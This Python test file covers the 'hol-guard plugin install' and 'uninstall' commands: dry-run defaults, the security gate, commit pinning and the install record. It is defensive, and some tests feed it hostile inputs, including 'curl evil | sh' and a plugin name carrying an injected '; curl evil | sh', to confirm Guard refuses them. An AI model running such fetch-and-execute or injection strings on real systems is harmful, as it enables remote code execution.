"""``hol-guard plugin install|uninstall``: plan rendering, the security gate, apply, and the install record.

The argv for each runtime, every refused spec, the gate's reasons and the
install record's rules are pinned by the Rust tests in
``rust/crates/guard-plugin-kit/tests/install.rs``; these cover the Python
side: dry-run by default, the exit codes, confirmation per runtime, no shell
and no stdin, the checks after Claude Code and Codex install, and the one JSON
document ``--json`` prints. ``FakeRuntimes`` stands in for the two CLIs and
writes the same state files they do, so the checks read real files.
"""

from __future__ import annotations

import contextlib
import datetime
import email.message
import http.server
import io
import json
import os
import shlex
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
import urllib.error
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from codex_plugin_scanner import cli as guard_cli
from codex_plugin_scanner.guard import config as guard_config
from codex_plugin_scanner.guard.plugin_kit import install, runner

SCANNED = "0123456789abcdef0123456789abcdef01234567"
OTHER = "fedcba9876543210fedcba9876543210fedcba98"
DECLARED = "ab" * 32


def _spec(**changes: Any) -> dict[str, Any]:
    spec: dict[str, Any] = {
        "schema": "hol.plugin-install-spec.v2",
        "slug": "acme/toolgate",
        "name": "toolgate",
        "version": "1.2.0",
        "repository": "acme/toolgate",
        "listingUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
        "trustScore": 82,
        "installable": True,
        "security": {
            "verdict": "pass",
            "scannedAt": f"{datetime.datetime.now(datetime.timezone.utc).date().isoformat()}T08:00:00Z",
            "scannedRef": SCANNED,
            "findings": {"critical": 0, "high": 0, "medium": 0, "low": 1},
            "reasons": [],
            "reportUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
        },
        "targets": [
            {
                "runtime": "claude-code",
                "marketplace": {"repository": "acme/toolgate", "name": "acme", "ref": SCANNED},
                "plugin": "toolgate",
            },
            {
                "runtime": "codex",
                "marketplace": {"repository": "acme/toolgate", "name": "acme", "ref": SCANNED},
                "plugin": "toolgate",
            },
            {"runtime": "agent-skills", "repository": "acme/toolgate"},
        ],
        "manual": ["mcp"],
    }
    spec.update(changes)
    return spec


SPEC = _spec()


class FakeRuntimes:
    """Claude Code and Codex as far as Guard can see them: their exit codes,
    their ``--json`` replies and the state files they write."""

    def __init__(self, root: Path) -> None:
        self.bin = root / "bin"
        self.bin.mkdir()
        for name in ("claude", "codex"):
            program = self.bin / name
            program.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
            program.chmod(0o755)
        self.claude_home = root / "claude-home"
        self.codex_root = root / "codex-marketplace"
        self.ran: list[list[str]] = []
        self.calls: list[dict[str, Any]] = []
        self.claude_commit = SCANNED
        self.codex_head = SCANNED
        self.codex_already = False
        self.codex_plugins: set[str] = set()
        self.codex_lists_nothing = False
        self.declared: str | None = None
        self.declared_ran = "node setup.js"
        self.claude_marketplace = root / "claude-marketplace"
        self.claude_marketplace_head = SCANNED
        self.head_after_install: str | None = None
        self.exit_codes: dict[tuple[str, ...], int] = {}
        self.raise_on: tuple[tuple[str, ...], BaseException] | None = None

    def _state(self, name: str) -> dict[str, Any]:
        path = self.claude_home / "plugins" / name
        return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}

    def _save(self, name: str, value: dict[str, Any]) -> None:
        path = self.claude_home / "plugins" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(value), encoding="utf-8")

    def __call__(self, argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
        program, args = Path(argv[0]).name, list(argv[1:])
        if args == ["--version"]:
            # The plan asks each program its version; that is not a change.
            return subprocess.CompletedProcess(argv, 0, stdout=f"{program} 1.2.3 (fake)\n")
        self.ran.append([program, *args])
        self.calls.append(kwargs)
        if self.raise_on and tuple([program, *args][: len(self.raise_on[0])]) == self.raise_on[0]:
            raise self.raise_on[1]
        for prefix, code in self.exit_codes.items():
            if tuple([program, *args][: len(prefix)]) == prefix:
                return subprocess.CompletedProcess(argv, code, stdout="")
        reply: dict[str, Any] | str = f"{program} did its part\n"
        code = 0
        if program == "claude" and args[:3] == ["plugin", "marketplace", "add"]:
            (self.claude_marketplace / ".git").mkdir(parents=True, exist_ok=True)
            head = self.claude_marketplace / ".git" / "HEAD"
            head.write_text(f"{self.claude_marketplace_head}\n", encoding="utf-8")
            catalog = self.claude_marketplace / ".claude-plugin" / "marketplace.json"
            catalog.parent.mkdir(exist_ok=True)
            source = {"source": "command", "command": "node setup.js"} if self.declared else "./toolgate"
            catalog.write_text(json.dumps({"name": "acme", "plugins": [{"name": "toolgate", "source": source}]}))
            self._save(
                "known_marketplaces.json",
                {
                    "acme": {
                        "source": {"source": "github", "repo": args[3]},
                        "installLocation": str(self.claude_marketplace),
                    }
                },
            )
        elif program == "claude" and args[:3] == ["plugin", "marketplace", "remove"]:
            known = self._state("known_marketplaces.json")
            known.pop(args[3], None)
            self._save("known_marketplaces.json", known)
        elif program == "claude" and args[:2] == ["plugin", "install"]:
            accepted = args[args.index("--accept-command") + 1] if "--accept-command" in args else None
            if self.declared and accepted != self.declared:
                code = 1
                reply = {
                    "outcome": "failed",
                    "failureCode": "command_source_refused",
                    "shownCommand": {"kind": "command_source", "command": "node setup.js", "sha256": self.declared},
                }
            else:
                installed = self._state("installed_plugins.json") or {"version": 2, "plugins": {}}
                # Claude Code records the command it ran, not a commit, for a
                # plugin installed by running a declared command.
                entry = {"sourceCommand": self.declared_ran} if self.declared else {"gitCommitSha": self.claude_commit}
                installed["plugins"][args[2]] = [{"scope": "user", **entry}]
                self._save("installed_plugins.json", installed)
                if self.head_after_install:
                    # The marketplace checkout moved while the install ran.
                    head = self.claude_marketplace / ".git" / "HEAD"
                    head.parent.mkdir(parents=True, exist_ok=True)
                    head.write_text(f"{self.head_after_install}\n", encoding="utf-8")
                reply = {"command": "install", "outcome": "ok", "pluginId": args[2]}
        elif program == "claude" and args[:2] == ["plugin", "uninstall"]:
            installed = self._state("installed_plugins.json")
            installed.get("plugins", {}).pop(args[2], None)
            self._save("installed_plugins.json", installed)
        elif program == "codex" and args[:3] == ["plugin", "marketplace", "add"]:
            (self.codex_root / ".git").mkdir(parents=True, exist_ok=True)
            (self.codex_root / ".git" / "HEAD").write_text(f"{self.codex_head}\n", encoding="utf-8")
            reply = {"installedRoot": str(self.codex_root), "alreadyAdded": self.codex_already}
        elif program == "codex" and args[:3] == ["plugin", "marketplace", "remove"]:
            self.codex_plugins = {plugin for plugin in self.codex_plugins if not plugin.endswith(f"@{args[3]}")}
        elif program == "codex" and args[:2] == ["plugin", "add"] and not self.codex_lists_nothing:
            self.codex_plugins.add(args[2])
        elif program == "codex" and args[:2] == ["plugin", "remove"]:
            self.codex_plugins.discard(args[2])
        elif program == "codex" and args[:3] == ["plugin", "list", "--json"]:
            reply = {"installed": [{"pluginId": plugin, "installed": True} for plugin in sorted(self.codex_plugins)]}
        piped = kwargs.get("stdout") is subprocess.PIPE
        stdout = (json.dumps(reply) if isinstance(reply, dict) else reply) if piped else None
        return subprocess.CompletedProcess(argv, code, stdout=stdout)

    def commands(self) -> list[list[str]]:
        return [argv for argv in self.ran]


@pytest.fixture(autouse=True)
def guard_home(tmp_path_factory: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path_factory.mktemp("guard-home")
    monkeypatch.setattr(guard_config, "resolve_guard_home", lambda override=None: home)
    return home


def _write_spec(tmp_path: Path, spec: dict[str, Any], name: str = "spec.json") -> Path:
    path = tmp_path / name
    path.write_text(json.dumps(spec), encoding="utf-8")
    return path


@pytest.fixture
def spec_file(tmp_path: Path) -> Path:
    return _write_spec(tmp_path, SPEC)


@pytest.fixture
def runtimes(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> FakeRuntimes:
    fake = FakeRuntimes(tmp_path)
    monkeypatch.setenv("PATH", str(fake.bin))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(fake.claude_home))
    monkeypatch.setattr(runner.subprocess, "run", fake)
    monkeypatch.setattr(runner, "_run_capped", lambda argv, **kwargs: fake(argv, stdout=subprocess.PIPE, **kwargs))
    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: False)
    # Keep the developer's own claude and codex installs out of the lookup.
    monkeypatch.setattr(install, "known_locations", lambda environ=None: [])
    return fake


@pytest.fixture
def terminal(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: True)


def _run(argv: list[str], stdin: str = "", argv0: str = "hol-guard") -> tuple[int, str, str]:
    output = io.StringIO()
    error = io.StringIO()
    original_argv, original_stdin = guard_cli.sys.argv, guard_cli.sys.stdin
    try:
        guard_cli.sys.argv = [argv0]
        guard_cli.sys.stdin = io.StringIO(stdin)
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(error):
            exit_code = guard_cli.main(argv)
    finally:
        guard_cli.sys.argv, guard_cli.sys.stdin = original_argv, original_stdin
    return exit_code, output.getvalue(), error.getvalue()


def _install(spec_path: Path, *flags: str, target: str = "acme/toolgate", stdin: str = "") -> tuple[int, str, str]:
    return _run(["plugin", "install", target, "--spec-file", str(spec_path), *flags], stdin=stdin)


def test_windows_launcher_name_prints_as_hol_guard(spec_file: Path, runtimes: FakeRuntimes) -> None:
    exit_code, output, _error = _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file)], argv0="hol-guard.EXE"
    )
    assert exit_code == 0
    assert "Undo: hol-guard plugin uninstall acme/toolgate --apply --runtime claude-code" in output
    assert ".EXE" not in output


def test_install_prints_the_plan_security_first_and_runs_nothing(spec_file: Path, runtimes: FakeRuntimes) -> None:
    exit_code, output, _error = _install(spec_file)
    assert exit_code == 0
    assert output.index("Security  Passed HOL's checks.") < output.index("Listing   ")
    assert f"at {SCANNED[:7]}: 0 critical, 0 high." in output
    assert f"Claude Code   {runtimes.bin / 'claude'} 1.2.3, your user settings" in output
    assert "Undo: hol-guard plugin uninstall acme/toolgate --apply --runtime claude-code" in output
    assert "claude plugin marketplace add acme/toolgate" in output
    assert f"codex plugin marketplace add acme/toolgate --ref {SCANNED}" in output
    assert "npx skills add acme/toolgate" in output
    assert "Run again with --apply. Guard asks before each runtime." in output
    assert max(len(line) for line in output.splitlines() if "/" not in line) <= 80
    assert "\x1b" not in output
    assert runtimes.ran == []


def test_dry_run_is_the_default_and_cannot_be_combined_with_apply(spec_file: Path, runtimes: FakeRuntimes) -> None:
    assert _install(spec_file, "--dry-run")[:2] == _install(spec_file)[:2]
    with pytest.raises(SystemExit):
        _install(spec_file, "--dry-run", "--apply")
    assert runtimes.ran == []


def test_apply_without_a_terminal_or_yes_exits_2_before_anything_runs(spec_file: Path, runtimes: FakeRuntimes) -> None:
    exit_code, _output, error = _install(spec_file, "--apply", stdin="y\ny\n")
    assert (exit_code, runtimes.ran) == (2, [])
    assert "No terminal to confirm in. Run it in a terminal, or add --yes to install without prompts." in error


def test_apply_confirms_each_runtime_and_never_runs_manual_steps(
    spec_file: Path, runtimes: FakeRuntimes, terminal: None, guard_home: Path
) -> None:
    exit_code, output, error = _install(spec_file, "--apply", stdin="y\nn\n")
    assert exit_code == 0, error
    assert runtimes.ran == [
        ["claude", "plugin", "marketplace", "add", "acme/toolgate"],
        ["claude", "plugin", "install", "toolgate@acme", "--json"],
    ]
    assert f"Install for claude-code with {runtimes.bin / 'claude'}? [y/N]" in error
    assert "codex: skipped." in output
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}


def test_yes_installs_every_runtime_with_no_stdin_then_uninstall_reverses_it(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    exit_code, _output, error = _install(spec_file, "--apply", "--yes")
    assert exit_code == 0, error
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code", "codex"]}
    assert all(call["stdin"] is subprocess.DEVNULL and call["shell"] is False for call in runtimes.calls)
    assert all(call["timeout"] == runner.COMMAND_TIMEOUT_SECONDS for call in runtimes.calls)
    runtimes.ran.clear()
    exit_code, output, _error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0
    # Guard added both marketplaces and nothing else uses them, so they go too.
    assert runtimes.ran == [
        ["claude", "plugin", "uninstall", "toolgate@acme"],
        ["claude", "plugin", "marketplace", "remove", "acme"],
        ["codex", "plugin", "list", "--json"],
        ["codex", "plugin", "remove", "toolgate@acme"],
        ["codex", "plugin", "list", "--json"],
        ["codex", "plugin", "marketplace", "remove", "acme"],
    ]
    assert output.count("Removed the acme marketplace Guard added.") == 2
    assert install.recorded_installs(guard_home) == {}


def test_a_failed_command_stops_that_runtime_and_is_not_recorded(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.exit_codes[("codex", "plugin", "add")] = 3
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 1
    assert "codex exited with 3" in error
    assert install.recorded_installs(guard_home) == {}


def test_a_runtime_that_hangs_is_stopped_and_reported(spec_file: Path, runtimes: FakeRuntimes) -> None:
    runtimes.raise_on = (("codex", "plugin", "add"), subprocess.TimeoutExpired(["codex"], 600))
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 1
    assert "codex did not finish within 600 seconds." in error


def test_ctrl_c_exits_130_and_records_nothing(spec_file: Path, runtimes: FakeRuntimes, guard_home: Path) -> None:
    runtimes.raise_on = (("codex", "plugin", "add"), KeyboardInterrupt())
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 130
    assert "Interrupted." in error
    assert install.recorded_installs(guard_home) == {}


def test_ctrl_c_after_one_runtime_still_reports_it_in_json(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.raise_on = (("codex", "plugin", "marketplace", "add"), KeyboardInterrupt())
    exit_code, output, _error = _install(spec_file, "--apply", "--yes", "--json")
    document = json.loads(output)
    assert (exit_code, document["error"]["code"]) == (130, "interrupted")
    assert [(item["runtime"], item["status"]) for item in document["runtimes"]] == [
        ("claude-code", "installed"),
        ("codex", "planned"),
        ("agent-skills", "skipped"),
    ]
    assert set(install.recorded_installs(guard_home)) == {"acme/toolgate"}


@pytest.mark.parametrize(
    ("changes", "reason"),
    [
        ({"installable": False, "blockedReason": "Quarantined after a malware report."}, "Quarantined after"),
        ({"security": {**SPEC["security"], "verdict": "block"}}, "HOL's scan blocked this plugin."),
        (
            {"security": {**SPEC["security"], "findings": {"critical": 1, "high": 0, "medium": 0, "low": 0}}},
            "HOL's scan found 1 critical issue.",
        ),
    ],
)
def test_a_blocked_listing_exits_4_before_any_runtime_starts(
    tmp_path: Path, runtimes: FakeRuntimes, changes: dict[str, Any], reason: str
) -> None:
    path = _write_spec(tmp_path, _spec(**changes))
    for flags in ((), ("--apply", "--yes", "--accept-risk")):
        exit_code, output, error = _install(path, *flags)
        assert exit_code == 4
        assert "Security  Blocked. Guard will not install it." in output
        assert reason in output
        assert "HOL's scan result stops this install, so nothing ran." in error
        assert "Run with --apply" not in output
    assert runtimes.ran == []


@pytest.mark.parametrize(
    ("changes", "reason"),
    [
        ({"security": {**SPEC["security"], "verdict": "warn"}}, "HOL's scan flagged this plugin for review."),
        ({"security": None}, "HOL has not scanned this plugin."),
        ({"trustScore": 41}, "HOL trust score is 41/100, below 60."),
        ({"security": {**SPEC["security"], "scannedAt": "2020-01-01T00:00:00Z"}}, "days old."),
    ],
)
def test_a_risky_listing_needs_accept_risk_or_a_yes_at_the_prompt(
    tmp_path: Path,
    runtimes: FakeRuntimes,
    monkeypatch: pytest.MonkeyPatch,
    guard_home: Path,
    changes: dict[str, Any],
    reason: str,
) -> None:
    spec = _spec(**changes)
    if spec["security"] is None:
        del spec["security"]
    path = _write_spec(tmp_path, spec)
    exit_code, output, error = _install(path, "--apply", "--yes")
    assert (exit_code, runtimes.ran) == (4, [])
    assert "Security  Needs your OK before Guard installs it." in output
    assert reason in output
    assert "add --accept-risk with --yes" in error

    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: True)
    exit_code, _output, error = _install(path, "--apply", stdin="\n")
    assert (exit_code, runtimes.ran) == (4, [])
    assert "Install anyway? [y/N]" in error

    exit_code, _output, error = _install(path, "--apply", "--yes", "--accept-risk", "--runtime", "codex")
    assert exit_code == 0, error
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["codex"]}


def test_a_v1_spec_carries_no_scan_so_it_always_asks(tmp_path: Path, runtimes: FakeRuntimes) -> None:
    v1 = {key: value for key, value in SPEC.items() if key not in {"security", "installable"}}
    v1["schema"] = "hol.plugin-install-spec.v1"
    v1["targets"] = [
        {**target, "marketplace": {"repository": "acme/toolgate", "name": "acme"}}
        if "marketplace" in target
        else target
        for target in SPEC["targets"]
    ]
    exit_code, output, _error = _install(_write_spec(tmp_path, v1), "--apply", "--yes")
    assert (exit_code, runtimes.ran) == (4, [])
    assert "HOL has not scanned this plugin." in output


def test_claude_code_installing_another_commit_is_rolled_back(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.claude_commit = OTHER
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
    assert exit_code == 4
    assert f"Claude Code installed commit {OTHER[:7]}, not the commit HOL scanned ({SCANNED[:7]})." in error
    assert "Guard removed it again." in error
    assert runtimes.ran[-2:] == [
        ["claude", "plugin", "uninstall", "toolgate@acme"],
        ["claude", "plugin", "marketplace", "remove", "acme"],
    ]
    assert install.recorded_installs(guard_home) == {}


def test_claude_code_already_at_another_commit_is_left_as_it_is(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes._save(
        "installed_plugins.json",
        {"version": 2, "plugins": {"toolgate@acme": [{"scope": "user", "gitCommitSha": OTHER}]}},
    )
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
    assert (exit_code, runtimes.ran) == (4, [])
    assert f"Claude Code already has toolgate@acme at commit {OTHER[:7]}, not the commit HOL scanned" in error
    assert "remove it first with: claude plugin uninstall toolgate@acme" in error
    assert install.recorded_installs(guard_home) == {}


def test_a_claude_code_install_that_never_finishes_takes_back_the_marketplace(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.raise_on = (("claude", "plugin", "install"), subprocess.TimeoutExpired(["claude"], 600))
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
    assert exit_code == 1
    assert "claude did not finish within 600 seconds. Guard removed what it added." in error
    assert runtimes.ran[-1] == ["claude", "plugin", "marketplace", "remove", "acme"]
    assert install.recorded_installs(guard_home) == {}


def test_a_marketplace_the_user_added_is_kept_and_one_from_elsewhere_is_refused(
    spec_file: Path, runtimes: FakeRuntimes
) -> None:
    runtimes._save("known_marketplaces.json", {"acme": {"source": {"source": "github", "repo": "Acme/Toolgate"}}})
    runtimes.claude_commit = OTHER
    exit_code, _output, _error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
    assert exit_code == 4
    assert ["claude", "plugin", "marketplace", "add", "acme/toolgate"] not in runtimes.ran
    assert ["claude", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran
    assert runtimes.ran[-1] == ["claude", "plugin", "uninstall", "toolgate@acme"]

    runtimes.ran.clear()
    runtimes._save("known_marketplaces.json", {"acme": {"source": {"source": "github", "repo": "mallory/acme"}}})
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
    assert (exit_code, runtimes.ran) == (4, [])
    assert "already has a marketplace named acme from another source" in error


def test_codex_at_another_commit_is_refused_before_the_plugin_is_added(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.codex_head = OTHER
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 4
    assert f"Codex has the acme marketplace at commit {OTHER[:7]}" in error
    assert runtimes.ran == [
        ["codex", "plugin", "marketplace", "add", "acme/toolgate", "--ref", SCANNED, "--json"],
        ["codex", "plugin", "marketplace", "remove", "acme"],
    ]

    runtimes.ran.clear()
    runtimes.codex_already = True
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 4
    assert "You added that marketplace before" in error
    assert ["codex", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran
    assert install.recorded_installs(guard_home) == {}

    # A reply that does not say whether Codex added the marketplace leaves it.
    runtimes.ran.clear()
    runtimes.codex_already = "yes"  # type: ignore[assignment]
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 4
    assert "Codex did not say whether it added that marketplace, so Guard left it." in error
    assert ["codex", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran


def test_a_declared_install_command_runs_only_when_its_sha256_is_accepted(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    runtimes.declared = DECLARED
    base = ("--apply", "--yes", "--runtime", "claude-code")
    exit_code, output, error = _install(spec_file, *base)
    assert exit_code == 4
    assert "node setup.js" in output
    assert f"sha256 {DECLARED}" in output
    assert f"To run it, add --accept-command {DECLARED}." in error
    assert not any("--accept-command" in argv for argv in runtimes.ran)
    assert runtimes.ran[-1] == ["claude", "plugin", "marketplace", "remove", "acme"]

    exit_code, _output, error = _install(spec_file, *base, "--accept-command", "cd" * 32)
    assert exit_code == 4
    assert "does not match the command this plugin declares" in error
    assert install.recorded_installs(guard_home) == {}

    exit_code, _output, error = _install(spec_file, *base, "--accept-command", DECLARED)
    assert exit_code == 0, error
    assert ["claude", "plugin", "install", "toolgate@acme", "--json", "--accept-command", DECLARED] in runtimes.ran
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}
    exit_code, output, error = _install(spec_file, *base, "--accept-command", DECLARED)
    assert exit_code == 0, error
    assert "already installed" in output + error

    # Installing again would report "already installed", so start over to reach the prompt.
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: True)
    with pytest.raises(SystemExit):
        _install(spec_file, *base, "--accept-command", "not-a-sha")
    exit_code, _output, error = _install(spec_file, "--apply", "--runtime", "claude-code", stdin="y\ny\n")
    assert exit_code == 0, error
    assert "Let Claude Code run this command? [y/N]" in error


def test_json_prints_one_document_and_sends_everything_else_to_stderr(spec_file: Path, runtimes: FakeRuntimes) -> None:
    exit_code, output, error = _install(spec_file, "--apply", "--yes", "--json")
    assert exit_code == 0, error
    document = json.loads(output)
    assert document["schema"] == "hol-guard.plugin-install/1"
    assert document["exit_code"] == 0
    assert document["error"] is None
    assert document["plan"]["security"]["gate"] == "pass"
    assert [(item["runtime"], item["status"]) for item in document["runtimes"]] == [
        ("claude-code", "installed"),
        ("codex", "installed"),
        ("agent-skills", "skipped"),
    ]
    assert document["runtimes"][0]["path"] == str(runtimes.bin / "claude")
    assert "claude did its part" in error

    exit_code, output, _error = _install(spec_file, "--json")
    document = json.loads(output)
    assert (exit_code, document["apply"]) == (0, False)
    assert [item["status"] for item in document["runtimes"]] == ["planned", "planned", "skipped"]


def test_json_reports_a_stop_as_an_error_document(tmp_path: Path, runtimes: FakeRuntimes) -> None:
    path = _write_spec(tmp_path, _spec(installable=False))
    exit_code, output, _error = _install(path, "--apply", "--yes", "--json")
    document = json.loads(output)
    assert exit_code == document["exit_code"] == 4
    assert document["error"]["code"] == "blocked"
    assert {item["status"] for item in document["runtimes"][:2]} == {"blocked"}


@pytest.mark.parametrize(
    ("changes", "exit_code", "message"),
    [
        ({"minGuardVersion": "999.0.0"}, 5, "This listing needs hol-guard 999.0.0 or newer"),
        ({"schema": "hol.plugin-install-spec.v3"}, 5, "This listing needs a newer hol-guard."),
        ({"futureField": {"cmd": "curl evil | sh"}}, 0, ""),
        ({"minGuardVersion": "0.0.1"}, 0, ""),
    ],
)
def test_newer_specs_ask_for_a_newer_guard_and_unknown_fields_are_ignored(
    tmp_path: Path, runtimes: FakeRuntimes, changes: dict[str, Any], exit_code: int, message: str
) -> None:
    code, output, error = _install(_write_spec(tmp_path, _spec(**changes)))
    assert code == exit_code, error
    assert message in error
    assert "curl" not in output
    if exit_code == 5:
        assert "Run: hol-guard update" in error
        assert "pip install" not in error


def test_nothing_guard_can_install_exits_3(
    tmp_path: Path, runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
) -> None:
    skills_only = _spec(targets=[{"runtime": "agent-skills", "repository": "acme/toolgate"}])
    exit_code, _output, error = _install(_write_spec(tmp_path, skills_only))
    assert exit_code == 3
    assert "Guard cannot install this listing for any runtime it runs." in error

    monkeypatch.setenv("PATH", str(tmp_path / "empty"))
    exit_code, output, error = _install(_write_spec(tmp_path, SPEC), "--apply", "--yes")
    assert (exit_code, runtimes.ran) == (3, [])
    assert "claude not found." in output
    assert "Get Claude Code: npm install -g @anthropic-ai/claude-code" in output
    assert "Get Codex: npm install -g @openai/codex" in output
    assert "None of the runtimes Guard installs for" in error
    # A missing runtime is not an error while only planning.
    assert _install(_write_spec(tmp_path, SPEC))[0] == 0


def test_a_spec_with_command_text_is_refused_before_anything_runs(tmp_path: Path, runtimes: FakeRuntimes) -> None:
    bad = json.loads(json.dumps(SPEC))
    bad["targets"][0]["plugin"] = "toolgate; curl evil | sh"
    exit_code, output, error = _install(_write_spec(tmp_path, bad), "--apply", "--yes")
    assert (exit_code, output, runtimes.ran) == (4, "", [])
    assert "failed Guard's checks" in error


def test_a_pinned_version_must_match_the_listing(spec_file: Path) -> None:
    exit_code, _output, error = _install(spec_file, target="acme/toolgate@9.9.9")
    assert exit_code == 2
    assert "HOL does not list that version" in error


def test_a_spec_for_another_listing_is_refused(spec_file: Path, runtimes: FakeRuntimes) -> None:
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", target="acme/other")
    assert (exit_code, runtimes.ran) == (4, [])
    assert "different listing" in error


def test_uninstall_only_removes_what_guard_installed(spec_file: Path, runtimes: FakeRuntimes, guard_home: Path) -> None:
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert (exit_code, runtimes.ran) == (2, [])
    assert "no record of installing" in error

    _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    runtimes.ran.clear()
    # The listing has since left HOL: uninstall never asks HOL, so it still works.
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--runtime", "claude-code"])
    assert exit_code == 2
    assert "no record of installing" in error
    exit_code, _output, _error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0
    assert runtimes.ran == [
        ["codex", "plugin", "list", "--json"],
        ["codex", "plugin", "remove", "toolgate@acme"],
        ["codex", "plugin", "list", "--json"],
        ["codex", "plugin", "marketplace", "remove", "acme"],
    ]
    assert install.recorded_installs(guard_home) == {}

    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate@1.2.0"])
    assert exit_code == 2
    assert "without a version" in error
    with pytest.raises(SystemExit):
        _run(["plugin", "uninstall", "acme/toolgate", "--spec-file", str(spec_file)])
    with pytest.raises(SystemExit):
        _run(["plugin", "uninstall", "acme/toolgate", "--accept-risk"])


def test_an_unreadable_record_stops_apply_before_anything_runs(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    # Not a regular file, so Guard cannot tell whether it is corrupt and leaves it alone.
    (guard_home / "plugin-kit" / "installs.json").mkdir(parents=True)
    exit_code, output, error = _install(spec_file, "--runtime", "codex", "--apply", "--yes")
    assert (exit_code, runtimes.ran) == (1, [])
    assert "installed" not in output
    assert "could not be read" in error
    assert (guard_home / "plugin-kit" / "installs.json").is_dir()
    # A plan alone never reads the record.
    assert _install(spec_file, "--runtime", "codex")[0] == 0


def test_install_moves_a_corrupt_record_aside_and_uninstall_does_not(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    folder = guard_home / "plugin-kit"
    folder.mkdir()
    (folder / "installs.json").write_text("{not json", encoding="utf-8")
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert (exit_code, runtimes.ran) == (1, [])
    assert "could not be read" in error

    exit_code, _output, error = _install(spec_file, "--runtime", "codex", "--apply", "--yes")
    assert exit_code == 0, error
    moved = [path.name for path in folder.iterdir() if path.name.startswith("installs.json.corrupt-")]
    assert len(moved) == 1
    assert (folder / moved[0]).read_text(encoding="utf-8") == "{not json"
    assert f"It was moved to plugin-kit/{moved[0]} and a new one started." in error
    assert set(install.recorded_installs(guard_home)) == {"acme/toolgate"}


def test_a_record_that_cannot_be_written_fails_the_install(
    spec_file: Path, monkeypatch: pytest.MonkeyPatch, runtimes: FakeRuntimes
) -> None:
    def fail(*_args: Any, **_kwargs: Any) -> None:
        raise install.PluginInstallError("Guard could not update its install record in the Guard home.")

    monkeypatch.setattr(install, "record", fail)
    exit_code, output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 1
    assert "codex: installed" in output
    assert "may be out of date" in error


def test_only_guards_own_programs_can_run(runtimes: FakeRuntimes) -> None:
    plan = {
        "action": "install",
        "slug": "acme/toolgate",
        "steps": [
            {"runtime": "codex", "program": "bash", "available": True, "automatic": True, "commands": [["bash"]]}
        ],
    }
    lookup = install.find_programs()
    assert sorted(lookup.programs) == ["claude", "codex"]
    outcomes = install.apply_plan(plan, lookup=lookup, assume_yes=True, record=pytest.fail)
    assert [outcome.status for outcome in outcomes] == ["skipped"]
    shape = {**plan, "steps": [{**plan["steps"][0], "program": "codex", "commands": [["bash", "-c", "id"]]}]}
    with pytest.raises(install.PluginInstallError):
        install.apply_plan(shape, lookup=lookup, assume_yes=True, record=pytest.fail)
